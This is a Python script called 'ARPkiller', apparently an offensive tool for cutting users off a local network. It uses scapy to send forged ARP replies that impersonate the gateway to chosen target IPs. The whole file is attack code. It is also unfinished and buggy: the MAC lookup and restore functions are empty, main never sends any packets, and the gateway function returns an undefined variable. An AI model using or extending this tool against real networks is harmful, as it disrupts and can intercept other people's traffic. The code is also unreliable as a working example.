#!/usr/env/python3

from scapy.all import *
import os
import sys
import threading
import signal
import getopt
import re

DEFAULT_PACKET_PER_MIN = 6

def usage():
    print("ARPkiller - Disconnect users from the network")
    print()
    print("Flags:")
    print("{} - colon (:) seperated list of target ip addresses".format("\t-t --targets".ljust(20," ")))
    print("{} - number of packets to send per minute (default: 6)".format("\t-p --packets".ljust(20," ")))
    print()


def main():
    
    # If being used in command line mode
    if len(sys.argv) > 1:
        try: 
            opts,args = getopt.getopt(sys.argv[1:],"t:p:",["targets","packets"])
        except getopt.GetoptError as e:
            print(str(e))
            usage()
        target_list = ""
        packets_per_min = DEFAULT_PACKET_PER_MIN
        for o,a in opts:
            if o in ("-t","--targets"):
                target_list = a
                print(target_list)
            elif o in ("-p","--packets"):
                packets_per_min = int(a)
            else:
                print("[!] Invalid option {} with value {}".format(o,a))
                sys.exit(1)

        if packets_per_min <= 0:
            print("[!] Packets per minute must be a positive integer")
            sys.exit(1)

        if re.match(r'^\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}(:\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}){0,}$', target_list):
            target_list = target_list.split(":")
        else:
            print("[!] Invalid list of targets, should be colon (:) seperated IP addresses")



def poison_target(target):
    packet = ARP()
    packet.op = 2
    packet.psrc = get_gateway_ip()
    packet.pdst = target
    packet.hwdst = get_mac(packet.psrc)

    print("[+] Sending packet to {}".format(packet.pdst))
    send(packet)


def restore_target(target):
    pass


def get_mac(ip_address):
    pass


def get_gateway_ip():
    try:
        print("[+] Looking for gateway ip")
        gateway = sr1(IP(dst="www.google.com", ttl=0) / ICMP() / "XXXXXXXXXXX", verbose=False)
        print("[+] Found gateway ip at {}".format(gateway))
        return getGateway.src
    except:
        print("[-] Could not get gateway IP, please enter IP manually")
        return input("<APRkiller:#> Gateway IP: ")



if __name__ == '__main__':
    main()